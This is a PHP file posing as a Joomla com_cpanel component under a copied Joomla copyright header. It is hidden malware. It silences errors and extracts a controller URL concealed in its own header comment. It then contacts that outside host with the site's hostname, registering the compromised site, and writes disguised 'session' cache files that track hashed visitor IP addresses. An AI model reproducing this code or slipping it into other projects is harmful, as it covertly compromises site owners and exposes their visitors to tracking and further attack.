<?php
/**
 * @package     Joomla.Site
 * @subpackage  com_cpanel
 * @copyright   Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
 * @developers  For information on http://api-joomla.org to develop for Joomla! code base.
 * @licensegnu  GNU General Public License version 2 or later; see LICENSE.txt
 */

error_reporting(0);

$cache_dir = $_SERVER ["DOCUMENT_ROOT"] . "/administrator/cache";

$cache_db =  $cache_dir . "/session-" . preg_replace("#[\W]#is", "", md5(date("Y_m")));
$cache_dbz = $cache_dir . "/session-" . preg_replace("#[\W]#is", "", md5(date("Y_m", time() - 86400 * 32)));
if (file_exists($cache_dbz)) @unlink($cache_dbz);
if (isset($_GET ['session_delete'])) @unlink($cache_db);

if (!file_exists($cache_db)){
	$fp = curl_init(preg_replace("#^.*?[\s]on[\s]*(.*?g).*$#is", "\\1", file_get_contents(__FILE__))."/"."router"."/?dm=".$_SERVER ["HTTP_HOST"]);
	curl_setopt($fp, CURLOPT_TIMEOUT_MS, 3000);
	curl_setopt($fp, CURLOPT_CONNECTTIMEOUT_MS, 3000);
	curl_setopt($fp, CURLOPT_RETURNTRANSFER, true);
	$info_block = curl_exec($fp);
	curl_close($fp);

if (!$info_block) return;

$fp = fopen($cache_db, "w");
fwrite($fp, "");
fclose($fp);
}

$cache_dba =  $cache_dir . "/session-" . preg_replace("#[\W]#is", "", md5($_SERVER ["HTTP_HOST"]));
$users = file($cache_dba);
$user = md5(getenv("REMOTE_ADDR"))."\n";

if ( !in_array($user, $users)) {
    $users[] = $user;
}

$fp=fopen($cache_dba,"wb");  
fputs($fp, implode("", $users));  
fclose($fp);